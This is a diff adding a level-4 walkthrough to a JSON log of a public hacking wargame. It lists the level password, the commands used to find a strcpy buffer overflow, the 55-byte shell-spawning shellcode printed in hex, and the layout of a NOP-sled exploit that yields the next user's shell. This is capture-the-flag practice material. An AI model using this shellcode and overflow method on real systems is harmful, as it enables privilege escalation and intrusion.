@@ -78,6 +78,75 @@
     }
    ],
    "note": "Entry: telnet 6666 -> ROT13. The level2 README's 'backdoor' is /var/local/.<spaces>level4_backdoor (setuid level4 /bin/sh wrapper). Running it gives euid level4 -> cat /pass/level4 -> level4 login. Level3 is skipped by design (the level3 backdoor copy in /var/opt lost its setuid bit server-side; /pass/level3 is level3-only readable). Verified live 2026-11-24."
+  },
+  {
+   "lvl": 4,
+   "user": "level4",
+   "pw": "n3xt_l3v3l!",
+   "steps": [
+    {
+     "cmd": "ssh -p 2222 level4@blowfish.smashthestack.org",
+     "out": [
+      "level4@blowfish:~$ "
+     ]
+    },
+    {
+     "cmd": "cat ~/README",
+     "out": [
+      "There is a buffer overflow in /levels/level4 exploit it and move on to the next level!"
+     ]
+    },
+    {
+     "cmd": "cat /levels/level4.c",
+     "out": [
+      "char buf[256]; ... strcpy(buf,argv[1]); printf(\"%s\", buf);"
+     ]
+    },
+    {
+     "cmd": "objdump -d --no-show-raw-insn /levels/level4 | sed -n '/<main>:/,/ret/p'",
+     "out": [
+      "lea -0x108(%ebp),%eax ... call strcpy@plt",
+      "(buf at ebp-0x108 -> ret at offset 268)"
+     ]
+    },
+    {
+     "cmd": "cat /proc/sys/kernel/randomize_va_space; readelf -lW /levels/level4 | grep GNU_STACK",
+     "out": [
+      "0",
+      "GNU_STACK ... RWE"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/l4bf.asm",
+     "out": [
+      "(55-byte NUL-free geteuid/setreuid/setuid/execve /bin//sh shellcode)",
+      "[New] written"
+     ]
+    },
+    {
+     "cmd": "nasm -f elf32 /dev/shm/l4bf.asm -o /dev/shm/l4bf.o && objcopy -O binary --only-section=.text /dev/shm/l4bf.o /dev/shm/l4bf.bin && xxd -p",
+     "out": [
+      "31c0b0c9cd8089c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd8031c050682f2f7368682f62696e89e3505389e131d2b00bcd80",
+      "55 /dev/shm/l4bf.bin"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf4.py",
+     "out": [
+      "(A*268 + ret + 2000-byte NOP sled + shellcode; descending pipe-probe 0xbffffdc0..0xbffffcc0)",
+      "[New] 86L written"
+     ]
+    },
+    {
+     "cmd": "python /dev/shm/e_bf4.py",
+     "out": [
+      "landed in the shellcode at 0xbffffdc0",
+      "uid=1005(level5) gid=1004(level4) groups=1004(level4)",
+      "yummy_bluntz"
+     ]
+    }
+   ],
+   "note": "strcpy overflow, ASLR off + RWE stack. /tmp is quota-blocked for levelN users - work in /dev/shm. python 2.5.2 only on the box. Verified live 2026-11-25."
   }
  ],
  "goals": {}
